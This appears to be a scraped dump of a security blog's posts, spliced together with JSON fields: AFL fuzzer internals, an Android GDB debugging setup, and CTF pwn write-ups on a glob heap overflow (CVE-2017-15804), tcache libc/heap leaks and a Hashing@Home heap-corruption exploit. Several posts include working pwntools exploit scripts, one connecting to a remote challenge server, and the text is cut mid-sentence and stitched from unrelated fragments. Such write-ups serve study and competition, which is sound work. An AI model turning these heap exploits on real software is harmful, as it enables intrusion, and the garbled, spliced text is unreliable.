This blog post is solely meant as a means of documentation for whatever I've learnt and I'd be glad if it helps someone else too.\nThe background\nAFL is some of the most commonly used fuzzers in the wild. It is a coverage guided fuzzer. I'm not going to discuss what AFL is good at, you can always refer to it's source for knowing that.\nWe know that AFL is a coverage guided fuzzer , but how exactly does AFL collect coverage?\nCoverage measurements\nWhen you use afl-gcc or an instrumentation compiler of that sort , several instrumentation functions are added to the compiled executable for capturing coverage related information. More specifically, the instrumentation injected into compiled programs captures branch (edge)\ncoverage, along with coarse branch-taken hit counts.\nTo understand this better , here's the pseudo code in action for capturing branch coverage - \ncur_location = &lt;COMPILE_TIME_RANDOM&gt;;\nshared_mem[cur_location ^ prev_location]++; \nprev_location = cur_location &gt;&gt; 1;\n\nLet's break this down to understand it better - \n\n\nThe cur_location is generated randomly. The reason is to simplify the process of linking complex projects. Another reason why this is needed is that the output of XOR operations which follow need to be distributed uniformly. You might be wondering why this is needed , we will see more about this in a bit.\n\n\nThe shared_mem array is a 64 KB shared memory region passed to the instrumentation binary by the caller. Every byte set in the output map can be thought of as a hit for a particular branch (branch_src , branch_dst) tuple.\n\n\nThe cur_location ^ prev_location acts as a unique index to the shared mem responsible for unique hits.\n\n\nThe right shift operation in the last line is to preserve the directionality of tuples. Without this , A ^ B would be indistinguishable from B ^ A.\n\n\nBy now you might be wondering if there's a chance for the XOR operation to return the same result over a certain period or in more simpler terms , collision. Keeping this in mind, developers of AFL used the COMPILE_TIME_RANDOM to almost make sure that cur_location is unique.\nDespite of this certainity that the random time provides , there's still a chance of collisions. Here's where the size of the map comes to rescue and is chosen so that collisions are sporadic with almost all of the intended targets, which usually sport between 2k and 10k discoverable\nbranch points.\nMoreover , the size of the map is also small enough to fit into L2 cache which allows the the map to be analyzed in a matter of microseconds on the receiving end.\nThis form of coverage provides considerably more insight into the execution\npath of the program than simple block coverage.\nSo now that we know how AFL deals with coverage information , we should now look forward to understanding how AFL uses this coverage information to detect new behaviours.\nDetecting new behaviors\nThe idea is simple, AFL maintains a global map of &lt;branch_src , branch_dst&gt; tuples which can can be rapidly compared with individual traces and updated in just a couple of instructions and a simple loop.\nWhen a certain input produces an execution trace containing new tuples (essentially a new code path) , the input file is preserved and routed for additional processing later on. As expected , inputs which do not generate newer tupes are discarded even if the overall control flow sequence is unique. This allows for a more fine-grained and long-term exploration of program state all the while not having to perform any computationally intensive tasks.\nTo better understand how the algorithm works , lets have a look at the following execution traces - \n  #1: A -&gt; B -&gt; C -&gt; D -&gt; E\n  #2: A -&gt; B -&gt; C -&gt; A -&gt; E\n\nThe #2 trace is considered unique due to the presence of new tuples (CA, AE)\nBut now that #2 is processed ,something like the following wont be recognized as unique - \n#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E\n\nApart from new tuples , AFL also considers coarse magnitude count for tuple hit rate. This count is divided into several buckets - \n1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+\n\nChanges within a bucket's range are ignored but transition from one bucket to another is flagged as an interesting change in program's control flow.\nThis hit count behaviour can tell us alot more about potentially interesting control flow changes. As you can guess by now , all these algorithms running under the hoodf of AFL are fairly memory expensive.\nNow that we've seen how AFL detects new behaviours , let us also see how AFL optimizes it's fuzzing efforts.\nCulling the corpus\nAFL periodically re-evaluates the input queue using a fast algorithm that selects a smaller subset of test cases that still cover every tuple seen so far and whose characterstics make them particularly favourable to the tool.\nThe algorithm works by assigning every queue entry a score proportional to it's execution policy and file size and then selecting lowest-scoring. The tuples are then processed as follows - \n\nFind next tuple not yet in temporary working set.\nLocate the winning queue for this tuple.\nRegister all tuples present in that entry's trace in working set.\nRepeat the above steps if there are any missing tuples in the set.\n\nSo what happens with the non-favoured entries? They're discarded? Well , apparently not. AFL doesn't discard non-favoured inputs, but they are skipped with varying probabilities when encountered in the queue : \n\n\nIf there are new yet-to-be-fuzzed favourites in the queue,  all non-favoured entires are discarded.\n\n\nIf no new favourites found : \n\nIf current non-favoured entry was fuzzed before, it will be skipped 95% of times.\nIf it hasn't gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.\n\n\n\nNow that we're aware of how the input corpus is selected curatively, we must also see how AFL manages inputs with large and varying sizes.\nTrimming the input files\nAs you can probably guess , file size has a drastic impact over the overall performence of the fuzzer. This is simply because large files make target binary slower and also because they reduce the likelihood that a mutation would touch important format control structures , rather than any redundant data blocks.\nLuckily for us, the instrumentation feedback provides a simple and robust way to automatically trim down input files while ensuring that changes made to the files have no impact on execution path.\nThe built-in trimmer attempts to sequentially remove blocks of data with variable length. Basically , any deletion which doesnt effect the checksum of the trace is commited to the disk.\nThere's also the standalone afl-tmin which provides more exhaustive iterative algorithm to perform normalization on trimmed files. \nThe actual minimization technique is : \n\nAttempt to zero large blocks of data with large stepovers.\nPerform a block detection pass with decreasing block sizes and stepovers - more like binary search.\nPerform alphabet normalization by counting unique characters and trying to bulk-replace each with zero value.\n\nNow that we have seen how AFL trims and optimizes input files for removing redundant data blocks , we should also have a look at how AFL chooses it's fuzzing strategies.\nFuzzing strategies\nEarly on during fuzzing, AFL chooses a fairly deterministic approach, and then progresses to random stacked modifications and test case splicing. The early stages include the following strategies : \n\nSequential bit flips with varying lengths.\nSequential additions and subtraction of small integers.\nSequential insertions of known interesting integers (negetive numbers, INT_MAX)\n\nThe non-deterministic approaches include stacked bit flips , insertions , deletions , arithmetics and splicing of different test cases.\nFork server\nTo improve performence, AFL uses something known as fork-server , where the fuzzed process goes through execve , and doing all the linking and initializing only once ; after that it is cloned from stopped process image by leveraging copy-on-write.\nThe way fork-server works is that it simply stops at the first instrumented function to await commands from afl-fuzz. \n","id":"https://pwnverse.github.io/posts/afl-internals/","title":"AFL Internals"},"https://pwnverse.github.io/posts/androidsetup/":{"body":"I've been meaning to learn some android exploitation for quite sometime now. In this post , I propose to document the method of setting up a proper debugging environment (for self reference too) to debug android applications with the good old GDB.\nA short insight into the Android system\nOne might consider android to be an open source linux based system , although it's not completely true , android does have the linux kernel layer in it. The only similarity between android and linux is that they share a similar kernel but apart from that , everything else is mostly different. In linux on one hand , you can directly get root access with the sudo command , but that isn't the case (unless you've rooted your phone) on android. With root access to an android phone , you can\nbasically access it's internal linux kernel layer and make modifications at the very heart of android , thus making it even more exciting to get your phone rooted. I have mentioned that android and linux share all their similarities in their kernel , which means they also have their differences.\nLinux Kernel vs Android Kernel\nThere are quite a few functionalities which have been added to linux kernel to make it adept to be used as the android kernel.\nIPC Binder\nSome apps attempt to implement IPC using traditional Linux techniques such as network sockets and shared files. However, now most apps use Android system functionality for IPC such as Intent, Binder or Messenger with a Service, and BroadcastReceiver. The Android IPC mechanisms allow you to verify the identity of the application connecting to your IPC and set security policy for each IPC mechanism.\nThere are 3 basic methods used for IPC on Android:\n\nAIDL\nMessenger\nBroadcast\n\nWhen do you know what to use?\n\nASHMEM (Android Shared Memory)\n\n\nAshmem is an Anonymous Shared Memory system that adds interfaces so processes can share named blocks of memory. As an example, the system could use Ashmem to store icons, which multiple processes could then access when drawing their UI.\n\n\nThe advantage of Ashmem over traditional Linux shared memory is that it provides a means for the kernel to reclaim these shared memory blocks if they are not currently in use.\n\n\nIf a process then tries to access a shared memory block the kernel has freed, it will receive an error, and will then need to reallocate the block and reload the data.\n\n\nProcess Memory Allocator (PMEM)\nThis is used to manage large physically contiguous regions of memory shared between userspace and kernel drivers.\nAshmem vs Pmem\n\nAshmem uses virtual memory whereas Pmem uses physically contiguous memory.\nWith Ashmem, we have reference counted objects that can be shared between multiple processes.\nPmem doesnt work that way because it needs to maintain physical to virtual mapping. This requires the process which allocates a pmem heap to hold the FD until all other references are dropped.\n\nAndroid Boot Process\nThese are the steps in which Android Booting happens:\n\nBootrom , the write-protected flash rom which is embedded inside the processor's chip runs the very first code when an android phone is powered up.\nBootloader is started by Bootrom which executes all boot specific setup ie, copies OS related programs into the main memory before firing up the kernel.\nKernel starts up scheduling and loading drivers, setup cache , mounts all file systems, and finally executes something called init which is essentially the first process.\ninit is the initial process which does things like mounting important directories like /sys , /dev and /proc and finally runs the init.rc script.\nThe init.rc is responsible for starting up important native daemons like the  Zygote process ,Service Manager, Media Server etc.\nAndroid Runtime is started by the init process with app_process command which tells it to start the process virtual machine - Art or Dalvik and finally call the zygote processes' main function.\n\n\nA little more about Zygote Process\nZygote is a special android process that enables shared code across process VM in contrast to Java VM where each instance has it's own copy of all shared library class files and heap objects.\nZygote preloads all classes and resources which an app may potentially need at runtime into system's memory when it first starts. This technique speeds up loading of apps. After loading all app related stuff,  zygote listens for connections on it's socket for requests of any new app starts. When a new app requests to start , zygote forks itself and launches the app. The zygote process serves as the parent to all android apps.\nZygote gets its forking feature from the Linux kernel implementation of copy-on-write technique. All processes starting from zygote use it's own copy. It doesnt actually copy anything , instead it maps pages of new process over those of the parent process and makes copies only when a new process writes on that page.\nSystem Server is the first process started by Zygote. After starting , it lives on as a separate process from it's parent. It starts initializing all system services. \nPre-requisites\n\n\nDownload and install latest version of Android Studio by following this wonderful blog.\n\n\nFor basic creating android virtual emulator , follow this blog.\n\n\nNow that everything is ready and set , let's get to some business.\nMaking system writeable\nTo run gdbserver on our device , we need to first make the /system folder writeable, by default , it is read-only.\nBy default , even if we run adb as root , a couple of times , while trying to mount /system as writeable we're hit with the /system not in /proc/mounts as the /system partition is made read only in the very booting up of the emulator itself.\nTo fix that ,we fire up the emulator with -writable system flag , and then we can remount system as writeable with adb root.\nTo view list of active devices , run\nadb-devices\n\nThe output should look something like this since we have just one device connected.\nList of devices attached\nemulator-5554\tdevice\n\nYou can simply get into the device with \nabd -s emulator-5554 shell\n\nNote that emulator-5554 is to be replaced with the name of the device we wish to connect to.\nTo get a list of all active emulators , navigate to the /path/to/Android/Sdk/ and run - \n~/Android/Sdk/tools ❯ ./emulator -list-avds\n\nCyb0rG\nPixel_3a_API_30_x86\n\n\nThe output should be something similar.\nNow , to fire up our emulator with writeable system , run\n./emulator -avd Cyb0rG -writable-system\n\nAgain , Cyb0rG should be replaced with the name of the desired avd.\nAfter that,  we run adb as root and remount it because it is by default mounted as read-only even if -writable-system is used.\nadb root\nadb remount\nadb -s emulator-5554 shell\n\nFinally, inside the device , mount the /system as read-write.\nmount -o rw,remount /system\nmount -o rw,remount /\n\nSetting up the gdbserver\nVerify the architecture of your connected device with uname -m inside the adb shell.\nNavigate to the ndk folder which should ideally be located in the Sdk folder itself. Once there , you will find a prebuilt folder in which we find gdbserver for various architectures.\nSince I'm running the emulator on x86 , this is the path to gdbserver in my machine.\n~/Android/Sdk/ndk/22.1.7171670/prebuilt/android-x86_64/gdbserver\n\nOnce here, we push gdbserver into our device with adb push gdbserver /system/bin.\nNow that we have pushed gdbserver , we can easily attach to any process by it's process id. We get the pid of a process with ps aux | grep &lt;process_name&gt;.\ngdbserver :8888 --attach 2741\n\nReplace 2741 with the pid of the process you wish to debug.\nAfter that , we port forward from adb shell to our host machine so that we can debug from the comforts of our local machine.\nadb forward tcp:8888 tcp:8888\n\nNow, all that is left is to fire up gdb , and run target remote :8888.\nConclusion\nThat's all there is to setup gdb to debug native android applications.\n","id":"https://pwnverse.github.io/posts/androidsetup/","title":"Setting up debugging on Android"},"https://pwnverse.github.io/posts/baby-glob/":{"body":"tl;dr\n\nHeap Overflow in glob function while handling Tilde operator.\nAbuse null byte overflow to gain RCE.\n\nChallenge Points: 983\nNo of Solves: 9\nChallenge Author: Cyb0rG\nChallenge Description\nA Super secure path finder from your own 2017.\nTo start with , the challenge handout folder contains the binary , chall.c and glob.c.\nThe binary is a standard CTF-style executable. According to the description , the challenge is running on standard ubuntu 20.04 docker container so the libc naturally is 2.31.\nInitial Analysis\nThere are 4 straightforward functions \n\nAdd Path - Takes a pattern of user supplied size (limited to 0x1000) , mallocs it and stores it in a global array of patterns.\nCheck Path - Takes an index , and uses the glob function to check if there exists a pathname matching the pattern.\nView Path - Takes an index and prints the pattern.\nRemove Path - Frees the memory containing the pattern at a user specified index , and nulls out the global array.\n\nIt is fairly trivial to get a libc leak , since malloc is used and size limit is 0x1000 , we can easily leak a libc main arena pointer to start with.\nBut where is the actual exploitable bug? The answer partly lies in the description as well as the glob.c provided. A quick internet search on glob cve 2017 quickly reveals the presence of an overflow while mishandling the Tilde operator. A little more research reveals a public poc available too. \nUsing the poc , we can see that we immediately trigger crash with malloc() corrupted top chunk.\nAnalysis of CVE-2017-15804\nThe code path which triggers the heap overflow is as follows -\nIn glob.c line: 523 , the first call to malloc happens and the data string is stored on heap.\n    else\n      {\n        newp = malloc (dirlen + 1);\n        if (newp == NULL)\n          return GLOB_NOSPACE;\n        malloc_dirname = 1;\n      }\n    *((char *) mempcpy (newp, pattern, dirlen)) = '\\0';\n    dirname = newp;\n    ++filename;\n\nWe are interested in the part of code from line: 575 of glob.c\n  if ((flags &amp; (GLOB_TILDE|GLOB_TILDE_CHECK)) &amp;&amp; dirname[0] == '~')\n\n\nThe very first character should be ~ and the flags should have the GLOB_TILDE to get into the if condition.\n\nNow , from line: 709 of glob.c , we see -\n         char *end_name = strchr (dirname, '/');\n         char *user_name;\n         int malloc_user_name = 0;\n         char *unescape = NULL;\n\n         if (!(flags &amp; GLOB_NOESCAPE))\n           {\n             if (end_name == NULL)\n               {\n                 unescape = strchr (dirname, '\\\\');\n                 if (unescape)\n                   end_name = strchr (unescape, '\\0');\n               }\n             else\n               unescape = memchr (dirname, '\\\\', end_name - dirname);\n           }\n         if (end_name == NULL)\n           user_name = dirname + 1;\n\n\nInput must contain a / so that the end_name is not null and we reach the else condition where unescape is initialized.\nInput should also contain \\\\ as unescape should not be null for triggering the heap overflow.\n\nIf all this is well , another malloc is called to store the string of size end_name - dir_name.\nWe have a lot of variables on out plate , so let's just list them all together at once.\n\nnewp = malloc(endname - dirname)\ndirname = input pointer\nendname = address of first occurence of /\nunescape = address of first occurence of \\\\\n\nThe following if condition is the actual cause of heap overflow.\nif (unescape != NULL)\n  {\n    char *p = mempcpy (newp, dirname + 1,\n                       unescape - dirname - 1);\n    char *q = unescape;\n    while (*q != '\\0')\n      {\n        if (*q == '\\\\')\n          {\n            if (q[1] == '\\0')\n              {\n                /* \"~fo\\\\o\\\\\" unescape to user_name \"foo\\\\\",\n                   but \"~fo\\\\o\\\\/\" unescape to user_name\n                   \"foo\".  */\n                if (filename == NULL)\n                  *p++ = '\\\\';\n                break;\n              }\n            ++q;\n          }\n        *p++ = *q++;\n      }\n    *p = '\\0';\n  }\n\n\nThe call to mempcpy copies into the newp pointer , input of size unescape - dirname - 1.\nIn a while loop , it is checked if the unescape string is \\\\ , if not , the character at unescape is copied into the region after mempcpy.\n\nObservation : It keeps copying the entire string without any out of bounds check and thus causes the heap overflow.\nExploit Idea\nUsing the public poc , we can check in gdb how things look and do some basic crash analysis.\nIn one iteration\n0x55555555b390:\t0x0000000000000000\t0x0000000000000061\n0x55555555b3a0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3b0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3c0:\t0x6161616161616161\t0x6161616161616477\n0x55555555b3d0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3e0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3f0:\t0x2f2f2f2f2f2f6161\t0x0000000000020c11 &lt;- top chunk\n\nIn next iteration\n0x55555555b390:\t0x0000000000000000\t0x0000000000000061\n0x55555555b3a0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3b0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3c0:\t0x6161616161616161\t0x6161616161616477\n0x55555555b3d0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3e0:\t0x6161616161616161\t0x6161616161616161\n0x55555555b3f0:\t0x2f2f2f2f2f2f6161\t0x0000000000020c2f &lt;- top chunk corrupted with input\n\nThis is what causes the malloc() corrupted top.\nFor the sake of ease of debugging , I have provided the challenge binary with debug symbols and source code stepping within gdb.\nNull byte to the rescue\nAfter playing around with the poc and tweaking it a bit , we realize that overflow is happening only with 0x2f byte which really isnt very interesting in terms of overwriting a tcache pointer fd or unsorted bin since it's not aligned. But with some effort and tweaking the poc , we can actually get a null byte overflow which is very powerful primitive as we all know.\nWith the null byte overflow , we can easily point tcache fd of a chunk to point to a fake chunk which resides at the memory ending with \\x00. With this , we can successfully construct a fake chunk containing free_hook as fd.\nConclusion\nI had randomly come across this CVE and found it very interesting, I hope you enjoyed solving the challenge.\nHere is the complete exploit.\nFlag - inctf{CVE-2017-15804_Subtl3_H3ap_Overfl0w}\n","id":"https://pwnverse.github.io/posts/baby-glob/","title":"Baby Glob - InCTF Internationals 2021"},"https://pwnverse.github.io/posts/command/":{"body":"We had a great time playing Pwn2Win CTF held this weekend.

That's enough to get libc right? But how?\nSo here's the idea , we allocate 8 chunks , free 8 chunks , now 7 of them go into tcache and one remaining chunk goes into unsorted bin.\nNow we can add back 7 chunks and consume all tcache , and adding one more will give us our unsorted bin chunk which we can read.\nReminding you that we have first 8 bytes on any malloc'd chunk exclusively reserved for Priority.\nIn order to get our beloved libc leak , we first need to make sure that all 8 bytes of Priority are occupied. This can be achieved by simply giving a size larger than 4 bytes which would trick cdqe into thinking it as negetive and thus filling up all 8 bytes of Priority.\nWait , what about Heap??\nIf we send two different chunks to unsorted bin , we can get unsorted bin chunks, one of whose bk pointer is heap.\nNice , so let's script it a bit.\n   if __name__==\"__main__\":\n    send_name('aaaaa')\n\n    #Initially we allocate 10 chunks\n    for i in xrange(10): \n        add(123,'a')\n    \n    #Then we start filling tcache from 3rd chunk\n    for i in xrange(3,10):\n        free(i)\n    #These two chunks go into unsorted bin chunks without merging.\n    free(0)\n    free(2)\n    #Now we consume all 7 tcache chunks that we first filled\n    for i in xrange(7):\n        add(123123,'fill_tcache')\n    #Finally , we get back our unsorted bin chunks whose bk pointers will give heap and libc.\n    add('123456789123','a')\n    add('123456789123','a')\n    view(8)\n    #Libc\n    io.recvuntil('Command: ')\n    libc_base = u64(io.recv(6) + '\\x00'*2) - 0x3ebc61\n    log.info(\"libc_base = \" + hex(libc_base))\n    one_gadget = libc_base + 0x10a38c\n    #Heap\n    view(9)\n    io.recvuntil('Command: ')\n    heap_base = u64(io.recv(6) + '\\x00'*2) - 0x561\n    log.info(\"heap_base = \" + hex(heap_base))\n    gdb.attach(io)\n   \n\nNow that we have the necessary leaks , let us return from our Menu Driven subroutine and execute the rest of the code.\n    ret()\n\nFrom here , we need help of our old friend , yes you guessed it right , gdb.\nThis is how the file structure created by fopen looks like.\ngdb-peda$ \n0x555555758070:\t0x00000000fbad2c84\t0x00005555557582a0 \n0x555555758080:\t0x00005555557582a0\t0x00005555557582a0\n0x555555758090:\t0x00005555557582a0\t0x0000555555758439\n0x5555557580a0:\t0x00005555557592a0\t0x00005555557582a0\n0x5555557580b0:\t0x00005555557592a0\t0x0000000000000000\n0x5555557580c0:\t0x0000000000000000\t0x0000000000000000\n0x5555557580d0:\t0x0000000000000000\t0x00007ffff7dd0680\n0x5555557580e0:\t0x0000000000000003\t0x0000000000000000\n0x5555557580f0:\t0x0000000000000000\t0x0000555555758150\n0x555555758100:\t0xffffffffffffffff\t0x0000000000000000\n0x555555758110:\t0x0000555555758160\t0x0000000000000000\n0x555555758120:\t0x0000000000000000\t0x0000000000000000\n0x555555758130:\t0x00000000ffffffff\t0x0000000000000000\n0x555555758140:\t0x0000000000000000\t0x00007ffff7dcc2a0\n0x555555758150:\t0x0000000000000000\t0x0000000000000000\n0x555555758160:\t0x0000000000000000\t0x0000000000000000\n0x555555758170:\t0x0000000000000000\t0x0000000000000000\n0x555555758180:\t0x0000000000000000\t0x0000000000000000\n0x555555758190:\t0x0000000000000000\t0x0000000000000000\n0x5555557581a0:\t0x0000000000000000\t0x0000000000000000\n0x5555557581b0:\t0x0000000000000000\t0x0000000000000000\n0x5555557581c0:\t0x0000000000000000\t0x0000000000000000\n0x5555557581d0:\t0x0000000000000000\t0x0000000000000000\n0x5555557581e0:\t0x0000000000000000\t0x0000000000000000\n0x5555557581f0:\t0x0000000000000000\t0x0000000000000000\n0x555555758200:\t0x0000000000000000\t0x0000000000000000\n0x555555758210:\t0x0000000000000000\t0x0000000000000000\n0x555555758220:\t0x0000000000000000\t0x0000000000000000\n0x555555758230:\t0x0000000000000000\t0x0000000000000000\n0x555555758240:\t0x0000000000000000\t0x0000000000000000\n0x555555758250:\t0x0000000000000000\t0x0000000000000000\n0x555555758260:\t0x0000000000000000\t0x0000000000000000\n0x555555758270:\t0x0000000000000000\t0x0000000000000000\n0x555555758280:\t0x0000000000000000\t0x0000000000000000\n0x555555758290:\t0x00007ffff7dcbd60 -&gt;

Anyways , jokes apart , following is the intended solution for this challenege.\nDescription\nWe have been provided with the source code running on the server side as well as the client side.\nSource Code Analysis\nInitially , let's compile the source with gcc -o server server.c.\nThe source code of the server binary is pretty straight forward.\nThe main function reads 3 arguments.\nint main(int argc, char** argv){\n    if (argc != 4) {\n        printf(\n            \"Usage: hashing_at_home_server key_bytes records_file output_file\\n\"\n            \"\\n\"\n            \"This software reads a file in chunks, hashes these chunks many times\\n\"\n            \"and then combine the hashes and hash them again for extra secureness.\\n\"\n            \"Unfortunately, this is resource-intensive, so it uses a networked worker\\n\"\n            \"to do the hash rounds in parallel.\\n\"\n            \"\\n\"\n            \"(TEST VERSION USING STDIO. use xinetd or something to make it networked)\\n\");\n        return 1;\n    }\n    key_bytes = calloc(1, 64);\n    strncpy(key_bytes, argv[1], 63);\n    read_input(argv[2]);\n    do_the_work();\n    write_output(argv[3]);\n    return 0;\n}\n\n\nThe first Argument is the string that is stored on the heap with a calloc call of 64 bytes.\nThe Second Argument is a char pointer to the read_input function.\nThe Third Argument is also a char pointer to the write_output function.\n\nThere are constants defined.\n#define ROUNDS 100\n#define CHUNK_SIZE 32\n#define CONTEXT_MAGIC 0x6861736822686f6dULL\n\n\nThe read_input function creates a structure for each allocated chunk.\nvoid read_input(char* filename){\n    int fd = open(filename, O_RDONLY);\n    char record[CHUNK_SIZE];\n    hash_rpc_context * previous=NULL;\n    while(read(fd,record,CHUNK_SIZE)==CHUNK_SIZE){\n        hash_rpc_context *context = calloc(1, sizeof(hash_rpc_context));\n        context-&gt;magic = CONTEXT_MAGIC;\n        context-&gt;next = previous;\n        context-&gt;rounds_left = ROUNDS;\n        for (unsigned i=0; i&lt;CHUNK_SIZE; ++i)\n            context-&gt;data_to_hash[i] = record[i] ^ key_bytes[i];\n        previous = context;\n    }\n    first_context = previous;\n    close(fd);\n}\n\nSubsequently , the read_input opens the file with name that was passed as second argument to the binary and then callocs chunks of size 32 bytes until the entire data from the file is read and then xors the content of file with the initial argument that was passed into the binary which obviously is hidden from our site.\nvoid do_the_work(){\n    for (hash_rpc_context* context = first_context; context; context = context-&gt;next){\n        send_request(context);\n    }\n    while(first_context-&gt;next) {\n        receive_response();\n    }\n}\n\nThis function iterates over all chunks and calls the function send_request.\nvoid send_request(const hash_rpc_context* request_context){\n    /* XXX: the request's pointer is used as the request ID\n     * maybe this should be an UUID? */\n    write(1, &amp;request_context, sizeof(request_context));\n    write(1, request_context-&gt;data_to_hash, CHUNK_SIZE);\n}\n\nThis function writes the content of all the user input chunks one by one by iterating through the linked list of all heap chunks except the very first one.\nThe first write prints heap address and hence we have Heap Leak with no efforts :P.\nThereafter , in the while loop of do_the_work function which executes till first_context-&gt;next is NULL and calls the function recieve_response.\nThe Idea of Exploitation\n\nvoid receive_response(){\n    hash_rpc_context* request_context;\n    char response_data[CHUNK_SIZE];\n    if (read(0, &amp;request_context, sizeof(request_context)) != sizeof(request_context)){\n        exit(2);\n    }\n    if (read(0, response_data, CHUNK_SIZE) != CHUNK_SIZE) {\n        exit(3);\n    }\n    if (request_context-&gt;magic != CONTEXT_MAGIC) {\n        exit(4);\n    }\n    process_response(request_context, response_data);\n}\n\n\nHere , we have arbitrary write , but how??\nWe have two reads being called read(0, &amp;request_context, sizeof(request_context)) and read(0, response_data, CHUNK_SIZE) both of which take user input from STDIN and then check whether the *(request_context+8)==CONTEXT_MAGIC and then calls the function process_response.\nInitially we would not trigger the process_response function if we give some random input but dont't forget we have heap leaks all of which come from the structure that we saw earlier and hence passing a heap address we leaked could get us ahead into the process_request function.\nNow comes the interesting part.\nvoid process_response(hash_rpc_context* request_context, char response_data[CHUNK_SIZE]){\n    --request_context-&gt;rounds_left;\n    if(request_context-&gt;rounds_left){\n        memcpy(request_context-&gt;data_to_hash, response_data, CHUNK_SIZE);\n        send_request(request_context);\n    } else {\n        if (\n            first_context-&gt;next &amp;&amp;\n            first_context-&gt;rounds_left == 0 &amp;&amp;\n            first_context-&gt;next-&gt;rounds_left == 0\n        ){\n            hash_together_the_first_two();\n        }\n    }\n}\n\nAwesome!! We have a memcpy here which copies response_data [We control] to request_context-&gt;data_to_hash [Also in our control].\ne\nHence , now we have almost arbitrary write on heap and stack also [But we dont have stack leak].\nOk , so the first idea that popped into my mind was , we could write on heap and fake its structure.\nWhat if we write the CONTEXT_MAGIC  somewhere else on the heap , then we could take a pointer 8 bytes off the place we wrote CONTEXT_MAGIC to and easily trigger heap overflow.\nBy triggering the heap overflow , we can overwrite the structure of the next chunk. \nBut what advantage does this give us??\n\nWe dont have Free call anywhere.\nWe dont have any unlink anywhere.\nAll we have is we can read data from almost anywhere on heap.\n\nIn response to all the information we had at the moment , I began searching for libc pointers on heap [if any] but found nothing to my disappointment :(.\nThis is where we were stuck during the CTF thinking of various possibilities of leaking libc and overwriting stack return address as we could trigger stack overflow also ,given we had a stack leak.\nOne interesting thing is that , we could craft the location of CONTEXT_MAGIC in such a way that , if we had a stack leak , we could easily bypass canary and get to the saved EIP.\nThereafter , we were totally puzzled as to how we should move forward with exploitation.\nThe server side binary had jemalloc implemenated. This caught our attention.\nConsidering this possibility that the further exploitation could be related to jemalloc, we started reading through internals of jemalloc without any luck.\nThe final Exploit\nIf we observe the process_response function there's an if condition which on returning true , calls a mysterious function , hash_together_the_first_two.\nAs we have heap overflow , we can satisfy the constraints of the if conditions and call that function.\nvoid hash_together_the_first_two(){\n    for (unsigned i=0; i&lt;CHUNK_SIZE; ++i){\n        first_context-&gt;next-&gt;data_to_hash[i] ^= first_context-&gt;data_to_hash[i];\n    }\n    /* TODO: free the first context. It crashes for some reason sometimes though */\n    first_context = first_context-&gt;next;\n    first_context-&gt;rounds_left = ROUNDS;\n    send_request(first_context);\n}\n\n\nThis function xors the data of current_chunk with the data of the current_chunk-&gt;next.\nThen , it updates the first_context to first_context-&gt;next.\nNote that first_context is the chunk most recently allocated and we could overwrite its fd by overflowing from the chunk just above it.\nIf we overwrite the fd of the first_context chunk with the heap address of key_bytes[the very first allocated chunk on heap] , we can view it's contents.\nOn server , the contents of only the first argument are hidden so we try to leak them also.\nAnd eventually , it turns out that , the key_bytes were nothing but the flag.\nHere is the complete exploit.\n#!/usr/bin/env python3\nfrom pwn import *\n \nr = remote('35.230.128.35', 1337)\nmagic = 0x6861736822686f6d\n \ndef read():\n    ptr = u64(r.recvn(8))\n    data = r.recvn(32)\n    print(f'{ptr:x}: {data}')\n    return ptr\n \ndef send(ptr, d0, d1, d2, d3):\n    r.send(p64(ptr))\n    r.send(p64(d0) + p64(d1) + p64(d2) + p64(d3))\n \nreqs = [read() for _ in range(16)]\n#Print contents of entire heap eventually printing flag also\nsend(reqs[0], 0, 0, 0, 0)\nread()\nsend(reqs[1], 0, 0, 0, magic)\nread()\nsend(reqs[0] - 16, 1, reqs[15] - 64 - 3*8, 0, 0)\nread()\nsend(reqs[0], 0, 0, 0, 0)\nread()\n\n","id":"https://pwnverse.github.io/posts/hashing/","title":"SpamAndHex 2020 Hashing@Home Writeup"},"https://pwnverse.github.io/posts/houseoflore/":{"body":"This attack was introduced for glibc &gt; 2.25 since the addition of tcache bins into glibc malloc.\nPS - This attack is mostly based on Shellphish's how2heap implementation.\nI will be using Hitcon's One Punch Man challenge to help you understand how this attack works.\nThe writeup is a humble attempt to elaborate Shellphish's implementation of House Of Lore.\nNOTE - This writeup is not the intended solution for the challenge involved.

Before all this , it initially mmaps a writeable region and then calls a function which generates a random 2 byte constraint.\nvoid get_rand(long *region)\n{\n    time_t toc;\n    unsigned int tic = time(&amp;toc),end_t;\n    do{\n    srand(tic/60);\n    unsigned int lower = 0x1000 , upper = 0xffff;\n    unsigned int rand_num = (rand()%(upper-lower+1)) + lower;\n    unsigned int delay = rand()%300 + 1;\n    end_t = tic + delay;\n    tic = tic + delay;\n    srand(end_t/30);\n    unsigned int rand_num_2 = (rand()%(upper-lower+1)) + lower;\n    memset(region,0,4);\n    memcpy(region,&amp;rand_num_2,2);\n    *(long *)region &amp;= (unsigned long)rand_num;\n    }\n    while(*(long *)region&lt;0x1000);\n    MProtect(region);\n}\n\n\nWe create a random 2 byte vulnerable contraint.\nFinally the mmaped region is mprotected to be read-only. \nLater on , the age is verified with the 2 byte contraint which has to be satisfied by the format string vulnerability.\nAn Unintended Flaw\nThe only thing I forgot to do was add a check to age (&lt; 0x900) , so that only format string can be used to bypass the check to enter the secret service. \nBut since I didn't add a check,  the format string is rendered useless as participants can directly calculate the age from the library using ctypes or plain python and give that as age :(.\n{: .notice}\nBut now I'd like to discuss how you could do it the intended way using format string.\nWell , I've included the fixed binary in the handout folder and now u can try the challenges without any unintended flaws :).\nThe Intended Way To Get Into The Secret Service\nHere's the exploit snippet which mimics the 2 byte contraint.\nfrom pwn import *\nimport ctypes\nfrom ctypes import *\nfrom time import sleep\nimport sys\n\ncontext.arch=\"amd64\"\nHOST = '35.245.143.0'\nPORT = 7777\nLIBC = ELF(\"./libc.so.6\",checksec = False)\nlibc = ctypes.cdll.LoadLibrary(\"./libc.so.6\")\ncontext.noptrace=True\nif(len(sys.argv)&gt;1):\n    io=remote(HOST,PORT)\nelse:\n    